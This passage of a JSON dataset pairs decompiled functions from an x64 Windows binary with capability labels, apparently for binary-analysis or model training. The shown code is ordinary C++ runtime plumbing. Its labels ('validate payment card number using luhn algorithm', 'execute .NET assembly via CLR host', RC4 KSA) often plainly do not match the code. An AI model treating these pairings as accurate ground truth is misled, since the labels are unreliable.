        "decompiled_code": "\nvoid fcn.1400ada80(ulong *arg1)\n\n{\n    *arg1 = 0x14010c390;\n    fcn.14009f7a0(arg1 + 2);\n    return;\n}\n",
        "token_count": 49
    },
    "1400aae2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400aae20(ulong *arg1)\n\n{\n    *arg1 = 0x14010a1c0;\n    fcn.14009f7a0(arg1 + 2);\n    return;\n}\n",
        "token_count": 52
    },
    "1400adc5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400adc50(ulong *arg1)\n\n{\n    *arg1 = 0x14010c3d0;\n    fcn.14009f7a0(arg1 + 2);\n    return;\n}\n",
        "token_count": 51
    },
    "1400aaff": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400aaff0(ulong *arg1)\n\n{\n    *arg1 = 0x14010a200;\n    fcn.14009f7a0(arg1 + 2);\n    return;\n}\n",
        "token_count": 50
    },
    "1400adfb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400adfb0(int64_t *arg1)\n\n{\n    int64_t *arg1_00;\n    \n    arg1_00 = arg1[2];\n    *arg1 = *0x140103510 + 0x10;\n    if (arg1_00 != NULL) {\n        if (*(*arg1_00 + 8) == 0x140097e60) {\n            fcn.140097e90(arg1_00);\n            fcn.1400b64d0(arg1_00);\n        }\n        else {\n            (**(*arg1_00 + 8))();\n        }\n    }\n    return;\n}\n",
        "token_count": 143
    },
    "1400ab38": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400ab380(int64_t *arg1)\n\n{\n    *arg1 = *0x140103150 + 0x10;\n    if (arg1[2] != NULL) {\n        (**(*arg1[2] + 8))();\n    }\n    return;\n}\n",
        "token_count": 65
    },
    "1400ae37": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400ae370(int64_t *arg1)\n\n{\n    int64_t *arg1_00;\n    \n    arg1_00 = arg1[2];\n    *arg1 = *0x140103520 + 0x10;\n    if (arg1_00 != NULL) {\n        if (*(*arg1_00 + 8) == 0x140098490) {\n            fcn.1400984c0(arg1_00);\n            fcn.1400b64d0(arg1_00);\n        }\n        else {\n            (**(*arg1_00 + 8))();\n        }\n    }\n    return;\n}\n",
        "token_count": 142
    },
    "1400ab73": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400ab730(int64_t *arg1)\n\n{\n    *arg1 = *0x140103160 + 0x10;\n    if (arg1[2] != NULL) {\n        (**(*arg1[2] + 8))();\n    }\n    return;\n}\n",
        "token_count": 65
    },
    "14009ffa": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14009ffa0(int64_t *arg1)\n\n{\n    *arg1 = *0x1401030f0 + 0x10;\n    if (arg1[2] != NULL) {\n        (**(*arg1[2] + 8))();\n    }\n    return;\n}\n",
        "token_count": 67
    },
    "1400a036": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400a0360(int64_t *arg1)\n\n{\n    *arg1 = *0x140103100 + 0x10;\n    if (arg1[2] != NULL) {\n        (**(*arg1[2] + 8))();\n    }\n    return;\n}\n",
        "token_count": 66
    },
    "1400a073": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400a0730(int64_t *arg1)\n\n{\n    *arg1 = *0x140103110 + 0x10;\n    if (arg1[2] != NULL) {\n        (**(*arg1[2] + 8))();\n    }\n    return;\n}\n",
        "token_count": 66
    },
    "1400a0b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400a0b00(int64_t *arg1)\n\n{\n    *arg1 = *0x140103120 + 0x10;\n    if (arg1[2] != NULL) {\n        (**(*arg1[2] + 8))();\n    }\n    return;\n}\n",
        "token_count": 67
    },
    "140080ef": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.140080ef0(ulong noname_0, int64_t *arg2, int64_t arg3)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint64_t uVar3;\n    int64_t in_R9;\n    uchar uStack33;\n    int64_t aiStack32 [2];\n    \n    aiStack32[0] = fcn.140075a60(arg3, arg3 + in_R9);\n    uVar3 = (**(*arg2 + 0x10))(arg2, aiStack32);\n    if (**0x140102a70 == 0) {\n        iVar2 = *(aiStack32[0] + -8);\n        *(aiStack32[0] + -8) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = aiStack32[0] + -8;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (0 < iVar2) {\n        return uVar3;\n    }\n    fcn.140075f90(aiStack32[0] + -0x18, &uStack33);\n    return uVar3 & 0xffffffff;\n}\n",
        "token_count": 277
    },
    "140080fa": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.140080fa0(ulong noname_0, int64_t *arg2, int64_t *arg3, int64_t arg4)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint64_t uVar4;\n    int64_t *arg1;\n    ulong in_stack_00000028;\n    uchar uStack121;\n    int64_t iStack120;\n    ulong uStack104;\n    uchar *puStack96;\n    uchar *puStack56;\n    uchar auStack40 [16];\n    \n    puStack56 = &stack0xffffffffffffffd8;\n    if ((arg3 != NULL) || (arg4 == 0)) {\n        puStack96 = 0x140080fd2;\n        fcn.1400a1210(&stack0xffffffffffffffc8, arg3, arg3 + arg4);\n        puStack96 = 0x140080fe6;\n        uVar3 = (**(*arg2 + 0x10))(arg2, &stack0xffffffffffffffc8, in_stack_00000028);\n        if (puStack56 != &stack0xffffffffffffffd8) {\n            puStack96 = 0x140080ff7;\n            fcn.1400b64d0();\n        }\n        return uVar3;\n    }\n    puStack96 = 0x140081006;\n    arg1 = arg3;\n    uStack104 = fcn.1400a3d10();\n    if (puStack56 != &stack0xffffffffffffffd8) {\n        puStack96 = 0x140081018;\n        fcn.1400b64d0();\n    }\n    puStack96 = 0x140081020;\n    fcn.14000f000(uStack104);\n    puStack96 = &stack0xffffffffffffffd8;\n    iStack120 = fcn.140075a60(arg1, arg1 + arg4);\n    uVar4 = (**(*arg3 + 0x10))(arg3, &stack0xffffffffffffff88);\n    if (**0x140102a70 == 0) {\n        iVar2 = *(iStack120 + -8);\n        *(iStack120 + -8) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = iStack120 + -8;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (0 < iVar2) {\n        return uVar4;\n    }\n    fcn.140075f90(iStack120 + -0x18, &stack0xffffffffffffff87);\n    return uVar4 & 0xffffffff;\n}\n",
        "token_count": 593
    },
    "14008103": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.140081030(ulong noname_0, int64_t *arg2, int64_t arg3)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint64_t uVar3;\n    int64_t in_R9;\n    uchar uStack33;\n    int64_t aiStack32 [2];\n    \n    aiStack32[0] = fcn.140075a60(arg3, arg3 + in_R9);\n    uVar3 = (**(*arg2 + 0x10))(arg2, aiStack32);\n    if (**0x140102a70 == 0) {\n        iVar2 = *(aiStack32[0] + -8);\n        *(aiStack32[0] + -8) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = aiStack32[0] + -8;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (0 < iVar2) {\n        return uVar3;\n    }\n    fcn.140075f90(aiStack32[0] + -0x18, &uStack33);\n    return uVar3 & 0xffffffff;\n}\n",
        "token_count": 276
    },
    "1400810e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.1400810e0(ulong noname_0, int64_t *arg2, int64_t *arg3, int64_t arg4)\n\n{\n    uint32_t uVar1;\n    ulong arg1;\n    uint64_t uVar2;\n    int64_t *piVar3;\n    ulong in_stack_00000028;\n    uchar *apuStack56 [2];\n    uchar auStack40 [16];\n    \n    apuStack56[0] = auStack40;\n    if ((arg3 == NULL) && (arg4 != 0)) {\n        piVar3 = arg3;\n        arg1 = fcn.1400a3d10();\n        if (apuStack56[0] != auStack40) {\n            fcn.1400b64d0();\n        }\n        fcn.14000f000(arg1);\n    // WARNING: Could not recover jumptable at 0x000140081179. Too many branches\n    // WARNING: Treating indirect jump as call\n        uVar2 = (**(*arg3 + 0x20))(arg3, piVar3 & 0xffffffff);\n        return uVar2;\n    }\n    fcn.1400a1210(apuStack56, arg3, arg3 + arg4);\n    uVar1 = (**(*arg2 + 0x10))(arg2, apuStack56, in_stack_00000028);\n    if (apuStack56[0] != auStack40) {\n        fcn.1400b64d0();\n    }\n    return uVar1;\n}\n",
        "token_count": 347
    },
    "14008133": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140081330(ulong noname_0, int64_t *arg2, int64_t *arg3, ulong arg4)\n\n{\n    ulong in_stack_00000028;\n    uchar *puStack40;\n    int64_t iStack32;\n    uchar auStack24 [16];\n    \n    (**(*arg2 + 0x18))(&puStack40, arg2, arg4, in_stack_00000028);\n    if (arg3[4] != NULL) {\n        (*arg3[4])(arg3);\n    }\n    *arg3 = arg3 + 2;\n    fcn.1400a1540(arg3, puStack40, puStack40 + iStack32);\n    arg3[4] = 0x1400808b0;\n    if (puStack40 != auStack24) {\n        fcn.1400b64d0();\n    }\n    return;\n}\n",
        "token_count": 200
    },
    "1400814c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400814c0(ulong noname_0, int64_t *arg2, int64_t *arg3, ulong arg4)\n\n{\n    ulong in_stack_00000028;\n    uchar *puStack40;\n    int64_t iStack32;\n    uchar auStack24 [16];\n    \n    (**(*arg2 + 0x18))(&puStack40, arg2, arg4, in_stack_00000028);\n    if (arg3[4] != NULL) {\n        (*arg3[4])(arg3);\n    }\n    *arg3 = arg3 + 2;\n    fcn.1400a4eb0(arg3, puStack40, puStack40 + iStack32 * 2);\n    arg3[4] = 0x140080930;\n    if (puStack40 != auStack24) {\n        fcn.1400b64d0();\n    }\n    return;\n}\n",
        "token_count": 204
    },
    "14008159": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140081590(ulong noname_0, int64_t *arg2, int64_t arg3)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    uchar uVar5;\n    int64_t iVar6;\n    uchar uStack65;\n    int64_t aiStack64 [2];\n    \n    uVar5 = (**(*arg2 + 0x10))(arg2);\n    *(arg3 + 0x48) = uVar5;\n    uVar5 = (**(*arg2 + 0x18))(arg2);\n    *(arg3 + 0x88) = 1;\n    *(arg3 + 0x49) = uVar5;\n    iVar4 = *arg2;\n    *(arg3 + 0x10) = 0;\n    *(arg3 + 0x28) = 0;\n    *(arg3 + 0x38) = 0;\n    (**(iVar4 + 0x20))(aiStack64, arg2);\n    iVar4 = *(aiStack64[0] + -0x18);\n    iVar6 = fcn.1400b64f0(iVar4 + 1);\n    fcn.14001efe0(aiStack64, iVar6, iVar4, 0);\n    *(iVar6 + iVar4) = 0;\n    *(arg3 + 0x18) = iVar4;\n    piVar1 = *0x140102a70;\n    *(arg3 + 0x10) = iVar6;\n    if (*piVar1 == 0) {\n        iVar3 = *(aiStack64[0] + -8);\n        *(aiStack64[0] + -8) = iVar3 + -1;\n    }\n    else {\n        LOCK();\n        piVar2 = aiStack64[0] + -8;\n        iVar3 = *piVar2;\n        *piVar2 = *piVar2 + -1;\n    }\n    if (iVar3 < 1) {\n        fcn.140075f90(aiStack64[0] + -0x18, &uStack65);\n    }\n    (**(*arg2 + 0x28))(aiStack64, arg2);\n    iVar4 = *(aiStack64[0] + -0x18);\n    iVar6 = fcn.1400b64f0(iVar4 + 1);\n    fcn.14001efe0(aiStack64, iVar6, iVar4, 0);\n    iVar3 = *piVar1;\n    *(iVar6 + iVar4) = 0;\n    *(arg3 + 0x28) = iVar6;\n    *(arg3 + 0x30) = iVar4;\n    if (iVar3 == 0) {\n        iVar3 = *(aiStack64[0] + -8);\n        *(aiStack64[0] + -8) = iVar3 + -1;\n    }\n    else {\n        LOCK();\n        piVar2 = aiStack64[0] + -8;\n        iVar3 = *piVar2;\n        *piVar2 = *piVar2 + -1;\n    }\n    if (iVar3 < 1) {\n        fcn.140075f90(aiStack64[0] + -0x18, &uStack65);\n    }\n    (**(*arg2 + 0x30))(aiStack64, arg2);\n    iVar4 = *(aiStack64[0] + -0x18);\n    iVar6 = fcn.1400b64f0(iVar4 + 1);\n    fcn.14001efe0(aiStack64, iVar6, iVar4, 0);\n    iVar3 = *piVar1;\n    *(iVar6 + iVar4) = 0;\n    *(arg3 + 0x38) = iVar6;\n    *(arg3 + 0x40) = iVar4;\n    if (iVar3 == 0) {\n        iVar3 = *(aiStack64[0] + -8);\n        *(aiStack64[0] + -8) = iVar3 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = aiStack64[0] + -8;\n        iVar3 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (0 < iVar3) {\n        return;\n    }\n    fcn.140075f90(aiStack64[0] + -0x18, &uStack65);\n    return;\n}\n",
        "token_count": 994
    },
    "140081d8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\nvoid fcn.140081d80(ulong noname_0, int64_t *arg2, int64_t arg3)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    uchar uVar5;\n    uint uVar6;\n    int64_t iVar7;\n    uchar uStack65;\n    int64_t aiStack64 [2];\n    \n    uVar5 = (**(*arg2 + 0x10))(arg2);\n    *(arg3 + 0x21) = uVar5;\n    uVar5 = (**(*arg2 + 0x18))(arg2);\n    *(arg3 + 0x22) = uVar5;\n    uVar6 = (**(*arg2 + 0x40))(arg2);\n    *(arg3 + 0x6f) = 1;\n    *(arg3 + 0x58) = uVar6;\n    iVar4 = *arg2;\n    *(arg3 + 0x10) = 0;\n    *(arg3 + 0x28) = 0;\n    *(arg3 + 0x38) = 0;\n    *(arg3 + 0x48) = 0;\n    (**(iVar4 + 0x20))(aiStack64, arg2);\n    iVar4 = *(aiStack64[0] + -0x18);\n    iVar7 = fcn.1400b64f0(iVar4 + 1);\n    fcn.14001efe0(aiStack64, iVar7, iVar4, 0);\n    *(iVar7 + iVar4) = 0;\n    *(arg3 + 0x18) = iVar4;\n    piVar1 = *0x140102a70;\n    *(arg3 + 0x10) = iVar7;\n    if (*piVar1 == 0) {\n        iVar3 = *(aiStack64[0] + -8);\n        *(aiStack64[0] + -8) = iVar3 + -1;\n    }\n    else {\n        LOCK();\n        piVar2 = aiStack64[0] + -8;\n        iVar3 = *piVar2;\n        *piVar2 = *piVar2 + -1;\n    }\n    if (iVar3 < 1) {\n        fcn.140075f90(aiStack64[0] + -0x18, &uStack65);\n    }\n    (**(*arg2 + 0x28))(aiStack64, arg2);\n    iVar4 = *(aiStack64[0] + -0x18);\n    iVar7 = fcn.1400b64f0(iVar4 + 1);\n    fcn.14001efe0(aiStack64, iVar7, iVar4, 0);\n    iVar3 = *piVar1;\n    *(iVar7 + iVar4) = 0;\n    *(arg3 + 0x28) = iVar7;\n    *(arg3 + 0x30) = iVar4;\n    if (iVar3 == 0) {\n        iVar3 = *(aiStack64[0] + -8);\n        *(aiStack64[0] + -8) = iVar3 + -1;\n    }\n    else {\n        LOCK();\n        piVar2 = aiStack64[0] + -8;\n        iVar3 = *piVar2;\n        *piVar2 = *piVar2 + -1;\n    }\n    if (iVar3 < 1) {\n        fcn.140075f90(aiStack64[0] + -0x18, &uStack65);\n    }\n    (**(*arg2 + 0x30))(aiStack64, arg2);\n    iVar4 = *(aiStack64[0] + -0x18);\n    iVar7 = fcn.1400b64f0(iVar4 + 1);\n    fcn.14001efe0(aiStack64, iVar7, iVar4, 0);\n    iVar3 = *piVar1;\n    *(iVar7 + iVar4) = 0;\n    *(arg3 + 0x38) = iVar7;\n    *(arg3 + 0x40) = iVar4;\n    if (iVar3 == 0) {\n        iVar3 = *(aiStack64[0] + -8);\n        *(aiStack64[0] + -8) = iVar3 + -1;\n    }\n    else {\n        LOCK();\n        piVar2 = aiStack64[0] + -8;\n        iVar3 = *piVar2;\n        *piVar2 = *piVar2 + -1;\n    }\n    if (iVar3 < 1) {\n        fcn.140075f90(aiStack64[0] + -0x18, &uStack65);\n    }\n    (**(*arg2 + 0x38))(aiStack64, arg2);\n    iVar4 = *(aiStack64[0] + -0x18);\n    iVar7 = fcn.1400b64f0(iVar4 + 1);\n    fcn.14001efe0(aiStack64, iVar7, iVar4, 0);\n    iVar3 = *piVar1;\n    *(iVar7 + iVar4) = 0;\n    *(arg3 + 0x48) = iVar7;\n    *(arg3 + 0x50) = iVar4;\n    if (iVar3 == 0) {\n        iVar3 = *(aiStack64[0] + -8);\n        *(aiStack64[0] + -8) = iVar3 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = aiStack64[0] + -8;\n        iVar3 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar3 < 1) {\n        fcn.140075f90(aiStack64[0] + -0x18, &uStack65);\n    }\n    uVar6 = (**(*arg2 + 0x48))(arg2);\n    *(arg3 + 0x5c) = uVar6;\n    uVar6 = (**(*arg2 + 0x50))(arg2);\n    *(arg3 + 0x60) = uVar6;\n    return;\n}\n",
        "token_count": 1368
    },
    "14008225": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\nvoid fcn.140082250(ulong noname_0, int64_t *arg2, int64_t arg3)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    uchar uVar5;\n    uint uVar6;\n    int64_t iVar7;\n    uchar uStack65;\n    int64_t aiStack64 [2];\n    \n    uVar5 = (**(*arg2 + 0x10))(arg2);\n    *(arg3 + 0x21) = uVar5;\n    uVar5 = (**(*arg2 + 0x18))(arg2);\n    *(arg3 + 0x22) = uVar5;\n    uVar6 = (**(*arg2 + 0x40))(arg2);\n    *(arg3 + 0x6f) = 1;\n    *(arg3 + 0x58) = uVar6;\n    iVar4 = *arg2;\n    *(arg3 + 0x10) = 0;\n    *(arg3 + 0x28) = 0;\n    *(arg3 + 0x38) = 0;\n    *(arg3 + 0x48) = 0;\n    (**(iVar4 + 0x20))(aiStack64, arg2);\n    iVar4 = *(aiStack64[0] + -0x18);\n    iVar7 = fcn.1400b64f0(iVar4 + 1);\n    fcn.14001efe0(aiStack64, iVar7, iVar4, 0);\n    *(iVar7 + iVar4) = 0;\n    *(arg3 + 0x18) = iVar4;\n    piVar1 = *0x140102a70;\n    *(arg3 + 0x10) = iVar7;\n    if (*piVar1 == 0) {\n        iVar3 = *(aiStack64[0] + -8);\n        *(aiStack64[0] + -8) = iVar3 + -1;\n    }\n    else {\n        LOCK();\n        piVar2 = aiStack64[0] + -8;\n        iVar3 = *piVar2;\n        *piVar2 = *piVar2 + -1;\n    }\n    if (iVar3 < 1) {\n        fcn.140075f90(aiStack64[0] + -0x18, &uStack65);\n    }\n    (**(*arg2 + 0x28))(aiStack64, arg2);\n    iVar4 = *(aiStack64[0] + -0x18);\n    iVar7 = fcn.1400b64f0(iVar4 + 1);\n    fcn.14001efe0(aiStack64, iVar7, iVar4, 0);\n    iVar3 = *piVar1;\n    *(iVar7 + iVar4) = 0;\n    *(arg3 + 0x28) = iVar7;\n    *(arg3 + 0x30) = iVar4;\n    if (iVar3 == 0) {\n        iVar3 = *(aiStack64[0] + -8);\n        *(aiStack64[0] + -8) = iVar3 + -1;\n    }\n    else {\n        LOCK();\n        piVar2 = aiStack64[0] + -8;\n        iVar3 = *piVar2;\n        *piVar2 = *piVar2 + -1;\n    }\n    if (iVar3 < 1) {\n        fcn.140075f90(aiStack64[0] + -0x18, &uStack65);\n    }\n    (**(*arg2 + 0x30))(aiStack64, arg2);\n    iVar4 = *(aiStack64[0] + -0x18);\n    iVar7 = fcn.1400b64f0(iVar4 + 1);\n    fcn.14001efe0(aiStack64, iVar7, iVar4, 0);\n    iVar3 = *piVar1;\n    *(iVar7 + iVar4) = 0;\n    *(arg3 + 0x38) = iVar7;\n    *(arg3 + 0x40) = iVar4;\n    if (iVar3 == 0) {\n        iVar3 = *(aiStack64[0] + -8);\n        *(aiStack64[0] + -8) = iVar3 + -1;\n    }\n    else {\n        LOCK();\n        piVar2 = aiStack64[0] + -8;\n        iVar3 = *piVar2;\n        *piVar2 = *piVar2 + -1;\n    }\n    if (iVar3 < 1) {\n        fcn.140075f90(aiStack64[0] + -0x18, &uStack65);\n    }\n    (**(*arg2 + 0x38))(aiStack64, arg2);\n    iVar4 = *(aiStack64[0] + -0x18);\n    iVar7 = fcn.1400b64f0(iVar4 + 1);\n    fcn.14001efe0(aiStack64, iVar7, iVar4, 0);\n    iVar3 = *piVar1;\n    *(iVar7 + iVar4) = 0;\n    *(arg3 + 0x48) = iVar7;\n    *(arg3 + 0x50) = iVar4;\n    if (iVar3 == 0) {\n        iVar3 = *(aiStack64[0] + -8);\n        *(aiStack64[0] + -8) = iVar3 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = aiStack64[0] + -8;\n        iVar3 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar3 < 1) {\n        fcn.140075f90(aiStack64[0] + -0x18, &uStack65);\n    }\n    uVar6 = (**(*arg2 + 0x48))(arg2);\n    *(arg3 + 0x5c) = uVar6;\n    uVar6 = (**(*arg2 + 0x50))(arg2);\n    *(arg3 + 0x60) = uVar6;\n    return;\n}\n",
        "token_count": 1367
    },
    "14008339": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.140083390(int64_t arg1, ulong arg2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    \n    cVar1 = (**(**(arg1 + 0xa0) + 0x30))();\n    if (cVar1 != '\\0') {\n        return *(arg1 + 0x10) - *(arg1 + 0x18);\n    }\n    iVar2 = (**(**(arg1 + 0xa0) + 0x38))\n                      (*(arg1 + 0xa0), arg2, *(arg1 + 0xa8), *(arg1 + 0xb8), *(arg1 + 0x10) - *(arg1 + 8));\n    return (iVar2 + *(arg1 + 0xa8)) - *(arg1 + 0xc0);\n}\n",
        "token_count": 187
    },
    "14008439": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t * fcn.140084390(int64_t *arg1, int64_t arg2, ulong arg3, ulong arg4)\n\n{\n    ulong uVar1;\n    char cVar2;\n    int64_t iVar3;\n    uint in_stack_00000028;\n    \n    *arg1 = -1;\n    *(arg1 + 1) = 0;\n    cVar2 = fcn.1400834a0(arg2);\n    if (cVar2 != '\\0') {\n        iVar3 = fcn.14007c180(arg2 + 0x50, arg3, arg4);\n        if (iVar3 != -1) {\n            uVar1 = *(arg2 + 0xa8);\n            *arg1 = iVar3;\n            *(arg2 + 0x81) = 0;\n            *(arg2 + 0x30) = 0;\n            *(arg2 + 0xb8) = uVar1;\n            *(arg2 + 0xc0) = uVar1;\n            uVar1 = *(arg2 + 0x70);\n            *(arg2 + 0x68) = in_stack_00000028;\n            *(arg2 + 0x18) = uVar1;\n            *(arg1 + 1) = in_stack_00000028;\n            *(arg2 + 8) = uVar1;\n            *(arg2 + 0x10) = uVar1;\n            *(arg2 + 0x20) = 0x0;\n            return arg1;\n        }\n    }\n    return arg1;\n}\n",
        "token_count": 346
    },
    "1400850e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid fcn.1400850e0(ulong *arg1, int64_t arg2)\n\n{\n    uint64_t uVar1;\n    uchar uVar2;\n    ushort uVar3;\n    ulong uVar4;\n    ulong uVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    uint uVar9;\n    \n    fcn.140095c40(arg1, arg2);\n    *(arg1 + 8) = 0;\n    uVar4 = *(arg2 + 0x70);\n    *arg1 = 0x14010aa70;\n    uVar5 = *(arg2 + 0x50);\n    arg1[9] = 0;\n    arg1[10] = uVar5;\n    *(arg2 + 0x50) = 0;\n    *(arg1 + 0xb) = *(arg2 + 0x58);\n    *(arg2 + 0x58) = 0;\n    uVar6 = *(arg2 + 0x60);\n    uVar7 = *(arg2 + 100);\n    uVar8 = *(arg2 + 0x68);\n    uVar9 = *(arg2 + 0x6c);\n    arg1[0xf] = *(arg2 + 0x78);\n    uVar3 = *(arg2 + 0x80);\n    arg1[0xe] = uVar4;\n    *(arg1 + 0x10) = uVar3;\n    *(arg2 + 0x60) = 0;\n    uVar1 = *(arg2 + 0x60);\n    *(arg1 + 0x82) = *(arg2 + 0x82);\n    uVar2 = *(arg2 + 0x83);\n    *(arg1 + 0xc) = uVar6;\n    *(arg1 + 100) = uVar7;\n    *(arg1 + 0xd) = uVar8;\n    *(arg1 + 0x6c) = uVar9;\n    *(arg1 + 0x83) = uVar2;\n    *(arg2 + 0x70) = 0;\n    arg1[0x11] = *(arg2 + 0x88);\n    uVar4 = *(arg2 + 0x90);\n    *(arg2 + 0x78) = 1;\n    *(arg2 + 0x80) = 0;\n    *(arg2 + 0x82) = 0;\n    *(arg2 + 0x88) = 0;\n    *(arg2 + 0x90) = 0;\n    arg1[0x12] = uVar4;\n    *(arg2 + 8) = 0x0;\n    *(arg1 + 0x13) = *(arg2 + 0x98);\n    *(arg2 + 0x98) = 